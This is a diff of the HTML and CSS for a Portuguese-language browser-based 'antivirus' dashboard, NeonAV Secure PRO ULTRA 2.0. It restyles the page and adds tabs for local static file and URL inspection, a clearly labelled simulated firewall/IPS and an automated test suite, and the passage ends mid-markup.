@@ -4,8 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#06120c">
-
-<title>NeonAV Secure PRO ULTRA</title>
+<title>NeonAV Secure PRO ULTRA 2.0</title>
 
 <style>
 :root{
@@ -21,12 +20,11 @@
     --orange:#ffad32;
     --yellow:#ffe66d;
     --blue:#43b5ff;
+    --purple:#b388ff;
     --shadow:0 0 25px rgba(0,255,136,.08);
 }
 
-*{
-    box-sizing:border-box;
-}
+*{ box-sizing:border-box; }
 
 body{
     margin:0;
@@ -39,15 +37,8 @@ body{
     min-height:100vh;
 }
 
-button,
-input,
-select{
-    font:inherit;
-}
-
-button{
-    cursor:pointer;
-}
+button,input,select{ font:inherit; }
+button{ cursor:pointer; }
 
 .app{
     max-width:1500px;
@@ -55,7 +46,7 @@ button{
     padding:20px;
 }
 
-/* Estilos da Capa */
+/* Capa */
 .cover{
     position:fixed;
     inset:0;
@@ -67,242 +58,209 @@ button{
     align-items:center;
     justify-content:center;
     z-index:100;
-    transition:opacity .5s ease-out, visibility .5s ease-out;
+    transition:opacity .4s ease-out, visibility .4s ease-out;
 }
-
-.cover.hidden{
-    opacity:0;
-    visibility:hidden;
-}
-
-.cover-content{
-    text-align:center;
-    padding:20px;
-    max-width:850px;
-}
-
+.cover.hidden{ opacity:0; visibility:hidden; pointer-events:none; }
+.cover-content{ text-align:center; padding:20px; max-width:880px; }
 .cover-logo{
-    font-size:120px;
+    font-size:110px;
     color:var(--green);
-    filter:drop-shadow(0 0 50px rgba(0,255,136,.5));
-    animation:pulse 2s infinite;
+    filter:drop-shadow(0 0 40px rgba(0,255,136,.45));
+    animation:pulse 2.2s infinite;
 }
-
 @keyframes pulse{
-    0%{ transform:scale(1); filter:drop-shadow(0 0 50px rgba(0,255,136,.5)); }
-    50%{ transform:scale(1.05); filter:drop-shadow(0 0 70px rgba(0,255,136,.7)); }
-    100%{ transform:scale(1); filter:drop-shadow(0 0 50px rgba(0,255,136,.5)); }
+    0%,100%{ transform:scale(1); }
+    50%{ transform:scale(1.04); }
 }
-
 .cover-title{
-    font-size:50px;
-    margin:15px 0 10px;
+    font-size:44px;
+    margin:12px 0 8px;
     color:var(--green);
-    text-shadow:0 0 25px var(--green);
+    text-shadow:0 0 22px rgba(0,255,136,.45);
 }
-
 .cover-subtitle{
-    font-size:15px;
+    font-size:14px;
     color:var(--muted);
-    margin-bottom:30px;
-    letter-spacing:2px;
+    margin-bottom:26px;
+    letter-spacing:1.5px;
     text-transform:uppercase;
 }
-
 .cover-features{
     display:flex;
     flex-wrap:wrap;
-    gap:12px;
+    gap:10px;
     justify-content:center;
-    margin-top:20px;
-    margin-bottom:40px;
+    margin-bottom:34px;
 }
-
 .cover-feature{
-    padding:8px 18px;
+    padding:7px 16px;
     border:1px solid var(--border);
     border-radius:30px;
     font-size:12px;
     color:var(--muted);
-    background:rgba(7,19,13,.5);
+    background:rgba(7,19,13,.6);
 }
-
-.cover-actions{
-    display:flex;
-    gap:15px;
-    justify-content:center;
-    flex-wrap:wrap;
-}
-
+.cover-actions{ display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
 .cover-btn{
-    padding:14px 28px;
+    padding:14px 26px;
     border-radius:12px;
     font-size:15px;
     font-weight:bold;
     transition:.2s;
     border:1px solid var(--border);
 }
-
 .cover-btn.primary{
     background:var(--green);
     color:#00170c;
     border-color:var(--green);
     box-shadow:0 0 25px rgba(0,255,136,.3);
 }
+.cover-btn.secondary{ background:#0a1d13; color:var(--text); }
+.cover-btn:hover{ transform:translateY(-2px); border-color:var(--green); }
 
-.cover-btn.primary:hover{
-    box-shadow:0 0 35px rgba(0,255,136,.5);
-    transform:translateY(-2px);
-}
-
-.cover-btn.secondary{
-    background:#0a1d13;
-    color:var(--text);
-    border-color:var(--border);
-}
-
-.cover-btn.secondary:hover{
-    border-color:var(--green);
-    box-shadow:0 0 15px rgba(0,255,136,.15);
-    transform:translateY(-2px);
-}
-
+/* Header */
 header{
     display:flex;
     justify-content:space-between;
     align-items:center;
     gap:20px;
-    padding:20px;
-    margin-bottom:20px;
+    padding:18px 20px;
+    margin-bottom:18px;
     border:1px solid var(--border);
     border-radius:18px;
     background:linear-gradient(135deg,#06120b,#0b1c13);
     box-shadow:var(--shadow);
 }
-
-.brand{
-    display:flex;
-    align-items:center;
-    gap:15px;
-}
-
+.brand{ display:flex; align-items:center; gap:15px; }
 .logo{
-    width:58px;
-    height:58px;
-    border-radius:16px;
+    width:54px;
+    height:54px;
+    border-radius:15px;
     display:grid;
     place-items:center;
-    font-size:28px;
+    font-size:26px;
     color:#00150b;
     background:var(--green);
-    box-shadow:0 0 25px rgba(0,255,136,.35);
+    box-shadow:0 0 20px rgba(0,255,136,.3);
 }
-
-h1{
-    margin:0;
-    font-size:25px;
+h1{ margin:0; font-size:23px; }
+.version-tag{
+    display:inline-block;
+    font-size:11px;
+    padding:3px 8px;
+    border-radius:6px;
+    background:rgba(0,255,136,.15);
+    color:var(--green);
+    border:1px solid var(--green);
+    vertical-align:middle;
+    margin-left:6px;
 }
-
-.subtitle{
-    margin:5px 0 0;
-    color:var(--muted);
-    font-size:13px;
-}
-
-.header-right {
-    display: flex;
-    align-items: center;
-    gap: 15px;
-}
-
+.subtitle{ margin:5px 0 0; color:var(--muted); font-size:13px; }
 .status{
-    padding:10px 15px;
+    padding:9px 15px;
     border:1px solid rgba(0,255,136,.3);
     border-radius:30px;
     color:var(--green);
     background:rgba(0,255,136,.06);
     font-weight:bold;
+    font-size:12px;
+}
+
+/* Abas */
+.nav-tabs{
+    display:flex;
+    gap:10px;
+    margin-bottom:20px;
+    border-bottom:1px solid var(--border);
+    padding-bottom:14px;
+    flex-wrap:wrap;
+}
+.tab-btn{
+    background:var(--panel);
+    border:1px solid var(--border);
+    color:var(--muted);
+    padding:11px 20px;
+    border-radius:12px;
+    font-weight:bold;
     font-size:13px;
+    transition:all .2s;
+    display:flex;
+    align-items:center;
+    gap:8px;
+}
+.tab-btn:hover{ color:var(--text); border-color:var(--green); }
+.tab-btn.active{
+    background:rgba(0,255,136,.1);
+    color:var(--green);
+    border-color:var(--green);
+    box-shadow:0 0 15px rgba(0,255,136,.15);
+}
+.mode-pill{
+    font-size:10px;
+    padding:2px 6px;
+    border-radius:4px;
+    text-transform:uppercase;
+}
+.mode-real{ background:rgba(0,255,136,.18); color:var(--green); }
+.mode-sim{ background:rgba(255,173,50,.2); color:var(--orange); }
+.mode-qa{ background:rgba(179,136,255,.2); color:var(--purple); }
+
+.tab-content{ display:none; }
+.tab-content.active{ display:block; }
+
+/* Banners de Transparência */
+.context-banner{
+    padding:12px 16px;
+    border-radius:12px;
+    margin-bottom:18px;
+    font-size:13px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    flex-wrap:wrap;
+}
+.context-banner.real{
+    background:rgba(0,255,136,.06);
+    border:1px solid rgba(0,255,136,.35);
+    color:#c8f7dc;
+}
+.context-banner.sim{
+    background:rgba(255,173,50,.08);
+    border:1px solid rgba(255,173,50,.4);
+    color:#ffe2b3;
+}
+.context-banner.qa{
+    background:rgba(179,136,255,.08);
+    border:1px solid rgba(179,136,255,.4);
+    color:#e6d9ff;
 }
 
-/* Navegação por Abas */
-.nav-tabs {
-    display: flex;
-    gap: 10px;
-    margin-bottom: 20px;
-    border-bottom: 1px solid var(--border);
-    padding-bottom: 15px;
-}
-
-.tab-btn {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    color: var(--muted);
-    padding: 12px 22px;
-    border-radius: 12px;
-    font-weight: bold;
-    font-size: 14px;
-    transition: all .2s;
-}
-
-.tab-btn:hover {
-    color: var(--text);
-    border-color: var(--green);
-}
-
-.tab-btn.active {
-    background: rgba(0,255,136,.1);
-    color: var(--green);
-    border-color: var(--green);
-    box-shadow: 0 0 15px rgba(0,255,136,.15);
-}
-
-.tab-content {
-    display: none;
-}
-
-.tab-content.active {
-    display: block;
-}
-
+/* Dashboard */
 .dashboard{
     display:grid;
     grid-template-columns:repeat(5,1fr);
     gap:12px;
     margin-bottom:20px;
 }
-
 .card{
     background:var(--panel);
     border:1px solid var(--border);
     border-radius:16px;
-    padding:18px;
+    padding:16px;
     box-shadow:var(--shadow);
 }
-
-.metric-title{
-    color:var(--muted);
-    font-size:12px;
-    text-transform:uppercase;
-}
-
-.metric-value{
-    font-size:27px;
-    font-weight:bold;
-    margin-top:8px;
-}
+.metric-title{ color:var(--muted); font-size:11px; text-transform:uppercase; }
+.metric-value{ font-size:26px; font-weight:bold; margin-top:6px; }
 
 .green{ color:var(--green); }
 .orange{ color:var(--orange); }
 .red{ color:var(--red); }
 .blue{ color:var(--blue); }
 .yellow{ color:var(--yellow); }
+.purple{ color:var(--purple); }
 
-.main{
-    display:grid;
-    grid-template-columns:1.4fr .6fr;
-    gap:20px;
-}
+.main{ display:grid; grid-template-columns:1.4fr .6fr; gap:20px; }
 
 .panel{
     background:rgba(7,19,13,.94);
@@ -312,14 +270,10 @@ h1{
     box-shadow:var(--shadow);
     margin-bottom:20px;
 }
-
-.panel h2{
-    margin-top:0;
-    font-size:18px;
-}
+.panel h2{ margin-top:0; font-size:17px; }
 
 .dropzone{
-    min-height:180px;
+    min-height:165px;
     border:2px dashed #195b3b;
     border-radius:16px;
     display:flex;
@@ -330,28 +284,15 @@ h1{
     transition:.2s;
     background:rgba(0,255,136,.025);
 }
-
 .dropzone.drag{
     border-color:var(--green);
     background:rgba(0,255,136,.08);
     transform:scale(1.01);
 }
+.drop-icon{ font-size:36px; margin-bottom:6px; }
+.dropzone strong{ color:var(--green); }
 
-.drop-icon{
-    font-size:40px;
-    margin-bottom:8px;
-}
-
-.dropzone strong{
-    color:var(--green);
-}
-
-.actions{
-    display:flex;
-    flex-wrap:wrap;
-    gap:9px;
-    margin-top:15px;
-}
+.actions{ display:flex; flex-wrap:wrap; gap:9px; margin-top:15px; }
 
 .btn{
     border:1px solid var(--border);
@@ -360,39 +301,17 @@ h1{
     padding:10px 14px;
     border-radius:10px;
     transition:.2s;
+    font-size:13px;
 }
+.btn:hover{ border-color:var(--green); box-shadow:0 0 15px rgba(0,255,136,.12); }
+.btn:disabled{ opacity:.45; cursor:not-allowed; }
+.btn.primary{ background:var(--green); color:#00170c; border-color:var(--green); font-weight:bold; }
+.btn.danger{ color:#fff; background:#3a1019; border-color:#6c1b2d; }
+.btn.warning{ color:#111; background:var(--orange); border-color:var(--orange); font-weight:bold; }
+.btn.blue{ color:#06131d; background:var(--blue); border-color:var(--blue); font-weight:bold; }
+.btn.purple{ color:#120624; background:var(--purple); border-color:var(--purple); font-weight:bold; }
 
-.btn:hover{
-    border-color:var(--green);
-    box-shadow:0 0 15px rgba(0,255,136,.12);
-}
-
-.btn.primary{
-    background:var(--green);
-    color:#00170c;
-    border-color:var(--green);
-    font-weight:bold;
-}
-
-.btn.danger{
-    color:#fff;
-    background:#3a1019;
-    border-color:#6c1b2d;
-}
-
-.btn.warning{
-    color:#111;
-    background:var(--orange);
-    border-color:var(--orange);
-}
-
-.btn.blue{
-    color:#06131d;
-    background:var(--blue);
-}
-
-input,
-select{
+input,select{
     width:100%;
     padding:11px;
     color:var(--text);
@@ -401,35 +320,30 @@ select{
     border-radius:9px;
     outline:none;
 }
+input:focus,select:focus{ border-color:var(--green); box-shadow:0 0 10px rgba(0,255,136,.1); }
 
-input:focus,
-select:focus{
-    border-color:var(--green);
-    box-shadow:0 0 10px rgba(0,255,136,.1);
+.validation-msg{
+    font-size:12px;
+    margin-top:6px;
+    min-height:16px;
+    color:var(--red);
 }
 
 .progress{
-    height:12px;
+    height:11px;
     background:#020805;
     border-radius:20px;
     overflow:hidden;
     border:1px solid var(--border);
     margin-top:15px;
 }
-
 .progress-bar{
     height:100%;
     width:0%;
     background:linear-gradient(90deg,var(--green2),var(--green));
-    box-shadow:0 0 15px rgba(0,255,136,.35);
     transition:.2s;
 }
-
-.progress-text{
-    font-size:12px;
-    color:var(--muted);
-    margin-top:7px;
-}
+.progress-text{ font-size:12px; color:var(--muted); margin-top:7px; }
 
 .filters{
     display:grid;
@@ -438,11 +352,7 @@ select:focus{
     margin-bottom:15px;
 }
 
-.results{
-    display:flex;
-    flex-direction:column;
-    gap:12px;
-}
+.results{ display:flex; flex-direction:column; gap:12px; }
 
 .result{
     background:#06110b;
@@ -451,7 +361,6 @@ select:focus{
     border-radius:14px;
     padding:16px;
 }
-
 .result.medium{ border-left-color:var(--yellow); }
 .result.high{ border-left-color:var(--orange); }
 .result.critical{ border-left-color:var(--red); }
@@ -462,36 +371,34 @@ select:focus{
     align-items:flex-start;
     gap:12px;
 }
-
-.filename{
-    font-size:17px;
-    font-weight:bold;
-    word-break:break-word;
-}
-
-.meta{
-    color:var(--muted);
-    font-size:12px;
-    margin-top:6px;
-}
+.filename{ font-size:16px; font-weight:bold; word-break:break-word; }
+.meta{ color:var(--muted); font-size:12px; margin-top:5px; }
 
 .badge{
-    padding:6px 10px;
+    padding:5px 10px;
     border-radius:20px;
     font-size:11px;
     font-weight:bold;
     white-space:nowrap;
 }
-
 .badge.low{ color:#00170c; background:var(--green); }
 .badge.medium{ color:#191300; background:var(--yellow); }
 .badge.high{ color:#211000; background:var(--orange); }
 .badge.critical{ color:#fff; background:var(--red); }
 
-.score{
-    font-size:25px;
-    font-weight:bold;
+.source-tag{
+    display:inline-block;
+    font-size:10px;
+    padding:2px 7px;
+    border-radius:5px;
+    margin-left:6px;
+    background:#0d261a;
+    border:1px solid var(--border);
+    color:var(--green);
+    vertical-align:middle;
 }
+
+.score{ font-size:24px; font-weight:bold; }
 
 .result-grid{
     display:grid;
@@ -499,43 +406,22 @@ select:focus{
     gap:10px;
     margin-top:14px;
 }
-
 .info{
     padding:10px;
     background:#08170f;
     border-radius:9px;
     border:1px solid #0e2c1c;
 }
+.info small{ display:block; color:var(--muted); margin-bottom:5px; font-size:11px; }
+.hash{ word-break:break-all; font-family:monospace; font-size:11px; }
 
-.info small{
-    display:block;
-    color:var(--muted);
-    margin-bottom:5px;
-}
-
-.hash{
-    word-break:break-all;
-    font-family:monospace;
-    font-size:11px;
-}
-
-.reasons{
-    margin-top:14px;
-}
-
-.reasons ul{
-    margin-bottom:0;
-    padding-left:20px;
-}
-
-.reasons li{
-    margin:5px 0;
-    color:#c8e9d5;
-}
+.reasons{ margin-top:14px; }
+.reasons ul{ margin-bottom:0; padding-left:20px; }
+.reasons li{ margin:5px 0; color:#c8e9d5; font-size:13px; }
 
 .ioc{
     display:inline-block;
-    padding:5px 8px;
+    padding:4px 8px;
     margin:3px;
     border-radius:6px;
     font-family:monospace;
@@ -543,10 +429,11 @@ select:focus{
     background:#241019;
     border:1px solid #60213a;
     color:#ff9bb0;
+    word-break:break-all;
 }
 
 .log{
-    max-height:300px;
+    max-height:280px;
     overflow:auto;
     background:#020704;
     border:1px solid var(--border);
@@ -555,45 +442,129 @@ select:focus{
     font-family:monospace;
     font-size:11px;
 }
+.log-line{ padding:4px 0; border-bottom:1px solid #082014; }
+.log-time{ color:var(--green); }
+.log-warn{ color:var(--orange); }
+.log-err{ color:var(--red); }
 
-.log-line{
-    padding:4px 0;
-    border-bottom:1px solid #082014;
-}
+.empty{ text-align:center; color:var(--muted); padding:32px 10px; }
 
-.log-time{
-    color:var(--green);
-}
+.stats-bar{ margin-top:10px; }
+.stats-label{ display:flex; justify-content:space-between; font-size:11px; color:var(--muted); margin-bottom:4px; }
+.stats-track{ height:8px; background:#020805; border-radius:10px; overflow:hidden; }
+.stats-fill{ height:100%; background:var(--green); transition:width .3s; }
 
-.empty{
-    text-align:center;
-    color:var(--muted);
-    padding:35px 10px;
-}
-
-.stats-bar{
-    margin-top:10px;
-}
-
-.stats-label{
+.toggle{
     display:flex;
+    align-items:center;
     justify-content:space-between;
-    font-size:11px;
-    color:var(--muted);
-    margin-bottom:4px;
+    gap:10px;
+    padding:10px 4px;
+    border-bottom:1px solid #0b2819;
+    font-size:13px;
 }
+.toggle input{ width:auto; accent-color:var(--green); }
 
-.stats-track{
-    height:8px;
-    background:#020805;
-    border-radius:10px;
+/* Firewall / IPS Simulado */
+.firewall-grid{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:15px;
+    margin-bottom:20px;
+}
+.fw-card{
+    background:var(--panel);
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:18px;
+    position:relative;
     overflow:hidden;
 }
-
-.stats-fill{
-    height:100%;
-    background:var(--green);
+.fw-card::before{
+    content:'';
+    position:absolute;
+    top:0; left:0;
+    width:4px; height:100%;
 }
+.fw-card.ddos::before{ background:var(--blue); }
+.fw-card.xss::before{ background:var(--yellow); }
+.fw-card.sql::before{ background:var(--orange); }
+.fw-card.brute::before{ background:var(--red); }
+.fw-title{ font-size:12px; color:var(--muted); text-transform:uppercase; }
+.fw-count{ font-size:30px; font-weight:bold; margin-top:8px; }
+
+.attack-feed{
+    max-height:420px;
+    overflow-y:auto;
+    display:flex;
+    flex-direction:column;
+    gap:10px;
+}
+.attack-item{
+    background:#05100a;
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:14px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:12px;
+}
+.attack-type-badge{
+    display:inline-block;
+    padding:3px 8px;
+    border-radius:6px;
+    font-size:10px;
+    font-weight:bold;
+    text-transform:uppercase;
+}
+.attack-type-badge.ddos{ background:rgba(67,181,255,.2); color:var(--blue); border:1px solid var(--blue); }
+.attack-type-badge.xss{ background:rgba(255,230,109,.2); color:var(--yellow); border:1px solid var(--yellow); }
+.attack-type-badge.sql{ background:rgba(255,173,50,.2); color:var(--orange); border:1px solid var(--orange); }
+.attack-type-badge.brute{ background:rgba(255,64,95,.2); color:var(--red); border:1px solid var(--red); }
+.attack-ip{ font-family:monospace; font-size:13px; color:var(--text); font-weight:bold; margin-top:4px; }
+.attack-details{ font-size:12px; color:var(--muted); }
+.blocked-badge{
+    background:rgba(0,255,136,.15);
+    color:var(--green);
+    border:1px solid var(--green);
+    padding:5px 11px;
+    border-radius:20px;
+    font-size:11px;
+    font-weight:bold;
+    white-space:nowrap;
+}
+.bypassed-badge{
+    background:rgba(255,64,95,.15);
+    color:var(--red);
+    border:1px solid var(--red);
+    padding:5px 11px;
+    border-radius:20px;
+    font-size:11px;
+    font-weight:bold;
+    white-space:nowrap;
+}
+
+/* Testes Automatizados */
+.test-summary{
+    display:grid;
+    grid-template-columns:repeat(4,1fr);
+    gap:12px;
+    margin-bottom:18px;
+}
+.test-case{
+    background:#05100a;
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:14px;
+    margin-bottom:10px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:12px;
+}
+.test-case.pass{ border-left:4px solid var(--green); }
+.test-case.fail{ border-left:4px solid var(--red); }
 
 .footer{
     text-align:center;
@@ -603,32 +574,28 @@ select:focus{
     padding:15px;
 }
 
+/* Modal */
 .modal{
     position:fixed;
     inset:0;
-    background:rgba(0,0,0,.75);
+    background:rgba(0,0,0,.78);
     display:none;
     align-items:center;
     justify-content:center;
     padding:20px;
     z-index:50;
 }
-
-.modal.show{
-    display:flex;
-}
-
+.modal.show{ display:flex; }
 .modal-box{
-    width:min(800px,100%);
+    width:min(760px,100%);
     max-height:90vh;
     overflow:auto;
     background:#07130d;
     border:1px solid var(--green);
     border-radius:18px;
-    padding:20px;
+    padding:22px;
     box-shadow:0 0 40px rgba(0,255,136,.15);
 }
-
 .close{
     float:right;
     border:0;
@@ -636,7 +603,6 @@ select:focus{
     color:#fff;
     font-size:25px;
 }
-
 .test-file{
     padding:12px;
     border:1px solid var(--border);
@@ -648,172 +614,43 @@ select:focus{
     gap:10px;
 }
 
-.toggle{
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    gap:10px;
-    padding:10px;
-    border-bottom:1px solid #0b2819;
-}
-
-.toggle input{
-    width:auto;
-}
-
-/* =========================================================
-   ESTILOS ESPECÍFICOS DO MÓDULO DE BLOQUEIO DE ATAQUES (IPS/FIREWALL)
-========================================================= */
-.firewall-grid {
-    display: grid;
-    grid-template-columns: repeat(4, 1fr);
-    gap: 15px;
-    margin-bottom: 20px;
-}
-
-.fw-card {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    padding: 20px;
-    position: relative;
-    overflow: hidden;
-}
-
-.fw-card::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 4px;
-    height: 100%;
-}
-
-.fw-card.ddos::before { background: var(--blue); }
-.fw-card.xss::before { background: var(--yellow); }
-.fw-card.sql::before { background: var(--orange); }
-.fw-card.brute::before { background: var(--red); }
-
-.fw-title {
-    font-size: 13px;
-    color: var(--muted);
-    text-transform: uppercase;
-}
-
-.fw-count {
-    font-size: 32px;
-    font-weight: bold;
-    margin-top: 10px;
-}
-
-.attack-feed {
-    max-height: 420px;
-    overflow-y: auto;
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-}
-
-.attack-item {
-    background: #05100a;
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 14px;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    animation: slideIn .3s ease-out;
-}
-
-@keyframes slideIn {
-    from { opacity: 0; transform: translateY(-10px); }
-    to { opacity: 1; transform: translateY(0); }
-}
-
-.attack-info {
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-}
-
-.attack-type-badge {
-    display: inline-block;
-    padding: 4px 8px;
-    border-radius: 6px;
-    font-size: 10px;
-    font-weight: bold;
-    text-transform: uppercase;
-    width: fit-content;
-}
-
-.attack-type-badge.ddos { background: rgba(67,181,255,.2); color: var(--blue); border: 1px solid var(--blue); }
-.attack-type-badge.xss { background: rgba(255,230,109,.2); color: var(--yellow); border: 1px solid var(--yellow); }
-.attack-type-badge.sql { background: rgba(255,173,50,.2); color: var(--orange); border: 1px solid var(--orange); }
-.attack-type-badge.brute { background: rgba(255,64,95,.2); color: var(--red); border: 1px solid var(--red); }
-
-.attack-ip {
-    font-family: monospace;
-    font-size: 13px;
-    color: var(--text);
-    font-weight: bold;
-}
-
-.attack-details {
-    font-size: 12px;
-    color: var(--muted);
-}
-
-.attack-status {
-    text-align: right;
-}
-
-.blocked-badge {
-    background: rgba(0,255,136,.15);
-    color: var(--green);
-    border: 1px solid var(--green);
-    padding: 6px 12px;
-    border-radius: 20px;
-    font-size: 11px;
-    font-weight: bold;
-}
-
 @media(max-width:1100px){
-    .dashboard, .firewall-grid { grid-template-columns:repeat(2,1fr); }
+    .dashboard,.firewall-grid,.test-summary{ grid-template-columns:repeat(2,1fr); }
     .main{ grid-template-columns:1fr; }
 }
-
 @media(max-width:700px){
     .app{ padding:10px; }
     header{ flex-direction:column; align-items:flex-start; }
-    .dashboard, .firewall-grid { grid-template-columns:repeat(1,1fr); }
-    .filters, .form-grid{ grid-template-columns:1fr; }
+    .dashboard,.firewall-grid,.test-summary{ grid-template-columns:1fr; }
+    .filters{ grid-template-columns:1fr; }
     .result-grid{ grid-template-columns:repeat(2,1fr); }
     .result-head{ flex-direction:column; }
-    .cover-title{ font-size:35px; }
-    .cover-logo{ font-size:90px; }
+    .cover-title{ font-size:32px; }
 }
 </style>
 </head>
 
 <body>
 
-<!-- Capa com Botões Clicáveis -->
+<!-- Capa -->
 <div class="cover" id="coverScreen">
     <div class="cover-content">
         <div class="cover-logo">🛡️</div>
-        <h2 class="cover-title">NeonAV Secure PRO ULTRA</h2>
-        <div class="cover-subtitle">Scanner Heurístico Multiplataforma • Firewall & IPS em Tempo Real</div>
+        <h2 class="cover-title">NeonAV Secure PRO ULTRA 2.0</h2>
+        <div class="cover-subtitle">Análise Estática Local Real • Simulador IPS Educativo • 11 Testes Automatizados</div>
         
         <div class="cover-features">
-            <span class="cover-feature">Proteção Offline</span>
-            <span class="cover-feature">SHA-512</span>
-            <span class="cover-feature">Análise IOC & Phishing</span>
-            <span class="cover-feature">Firewall IPS Ativo</span>
+            <span class="cover-feature">SHA-512 WebCrypto</span>
+            <span class="cover-feature">Entropia de Shannon</span>
+            <span class="cover-feature">Validação Estrita de Entradas</span>
+            <span class="cover-feature">Separação Real vs. Simulação</span>
+            <span class="cover-feature">Suíte QA (11 Testes)</span>
         </div>
 
         <div class="cover-actions">
-            <button class="cover-btn primary" id="coverStartBtn">🚀 Acessar Sistema</button>
-            <button class="cover-btn secondary" id="coverTestBtn">🧪 Abrir Laboratório de Testes</button>
+            <button class="cover-btn primary" id="coverStartBtn">🚀 Acessar Painel 2.0</button>
+            <button class="cover-btn secondary" id="coverTestBtn">🧪 Abrir Amostras Sintéticas</button>
+            <button class="cover-btn secondary" id="coverQaBtn">⚙️ Executar 11 Testes Automatizados</button>
         </div>
     </div>
 </div>
@@ -821,1097 +658,904 @@ select:focus{
 <div class="app">
 
 <header>
-<div class="brand">
-<div class="logo">🛡️</div>
-<div>
-<h1>NeonAV Secure PRO ULTRA</h1>
-<div class="subtitle">
-Scanner heurístico • SHA-512 • IOC • Firewall IPS & Bloqueio de Ataques
-</div>
-</div>
-</div>
-
-<div class="header-right">
-<div class="status" id="status">
-● SISTEMA PRONTO
-</div>
-</div>
+    <div class="brand">
+        <div class="logo">🛡️</div>
+        <div>
+            <h1>NeonAV Secure PRO ULTRA <span class="version-tag">v2.0</span></h1>
+            <div class="subtitle">Inspeção Estática Local • Validação Heurística de URL • Laboratório IPS</div>
+        </div>
+    </div>
+    <div class="status" id="status">● SISTEMA PRONTO</div>
 </header>
 
-<!-- Navegação por Abas -->
-<div class="nav-tabs">
-    <button class="tab-btn active" data-tab="scannerTab">🔍 Scanner de Arquivos & URLs</button>
-    <button class="tab-btn" data-tab="firewallTab">🛡️ Bloqueio de Ataques (IPS / Firewall)</button>
-</div>
+<!-- Navegação -->
+<nav class="nav-tabs" aria-label="Módulos do Sistema">
+    <button class="tab-btn active" data-tab="scannerTab">
+        🔍 Scanner Estático <span class="mode-pill mode-real">Análise Real</span>
+    </button>
+    <button class="tab-btn" data-tab="firewallTab">
+        🛡️ Firewall / IPS <span class="mode-pill mode-sim">Simulação</span>
+    </button>
+    <button class="tab-btn" data-tab="qaTab">
+        🧪 Testes Automatizados <span class="mode-pill mode-qa">11 Testes</span>
+    </button>
+</nav>
 
-<!-- ================= AB 1: SCANNER ================= -->
+<!-- ================= ABA 1: SCANNER REAL ================= -->
 <div id="scannerTab" class="tab-content active">
 
-<section class="dashboard">
-<div class="card">
-<div class="metric-title">Arquivos/URLs</div>
-<div class="metric-value green" id="totalFiles">0</div>
-</div>
+    <div class="context-banner real">
+        <span><strong>Modo de Inspeção Local Real:</strong> Os arquivos são processados 100% no navegador (SHA-512 real, entropia de Shannon e leitura de assinatura/texto). URLs passam por análise estrutural estática sem tráfego externo.</span>
+    </div>
 
-<div class="card">
-<div class="metric-title">Baixo</div>
-<div class="metric-value green" id="lowCount">0</div>
-</div>
+    <section class="dashboard">
+        <div class="card">
+            <div class="metric-title">Itens Analisados</div>
+            <div class="metric-value green" id="totalFiles">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Risco Baixo</div>
+            <div class="metric-value green" id="lowCount">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Risco Médio</div>
+            <div class="metric-value yellow" id="mediumCount">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Risco Alto</div>
+            <div class="metric-value orange" id="highCount">0</div>
+        </div>
+        <div class="card">
+            <div class="metric-title">Risco Crítico</div>
+            <div class="metric-value red" id="criticalCount">0</div>
+        </div>
+    </section>
 
-<div class="card">
-<div class="metric-title">Médio</div>
-<div class="metric-value yellow" id="mediumCount">0</div>
-</div>
+    <div class="main">
+        <main>
+            <section class="panel">
+                <h2>🔍 Área de Inspeção de Arquivos</h2>
 
-<div class="card">
-<div class="metric-title">Alto</div>
-<div class="metric-value orange" id="highCount">0</div>
-</div>
+                <div class="dropzone" id="dropzone">
+                    <div>
+                        <div class="drop-icon">📁</div>
+                        <strong>Arraste arquivos reais aqui</strong>
+                        <div style="margin:8px;color:var(--muted)">ou selecione do dispositivo para análise offline</div>
+                        <input type="file" id="fileInput" multiple style="display:none">
+                        <button class="btn primary" id="selectBtn">Selecionar arquivos</button>
+                    </div>
+                </div>
 
-<div class="card">
-<div class="metric-title">Crítico</div>
-<div class="metric-value red" id="criticalCount">0</div>
-</div>
-</section>
+                <!-- Análise Estrutural de URL -->
+                <div style="margin-top:16px; border-top:1px solid var(--border); padding-top:16px;">
+                    <label class="metric-title" for="urlInput" style="display:block; margin-bottom:8px;">
+                        🌐 Validação Estrutural de URL (Lexical & Phishing Heuristics)
+                    </label>
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" id="urlInput" placeholder="https://exemplo.com/login" maxlength="2048" autocomplete="off">
+                        <button class="btn primary" id="scanUrlBtn" style="white-space:nowrap;">Analisar URL</button>
+                    </div>
+                    <div class="validation-msg" id="urlValidationMsg" role="alert"></div>
+                </div>
 
-<div class="main">
+                <div class="actions">
+                    <button class="btn primary" id="scanBtn">🛡️ Processar Fila (<span id="queueCount">0</span>)</button>
+                    <button class="btn blue" id="testBtn">🧪 Gerar Amostra Sintética</button>
+                    <button class="btn" id="jsonBtn">Exportar JSON</button>
+                    <button class="btn" id="csvBtn">Exportar CSV</button>
+                    <button class="btn" id="htmlBtn">Relatório HTML</button>
+                    <button class="btn danger" id="clearBtn">Limpar Tudo</button>
+                </div>
 
-<main>
+                <div class="progress">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="progress-text" id="progressText">Aguardando arquivos reais ou URLs validadas...</div>
+            </section>
 
-<section class="panel">
-<h2>🔍 Área de análise de arquivos</h2>
+            <section class="panel">
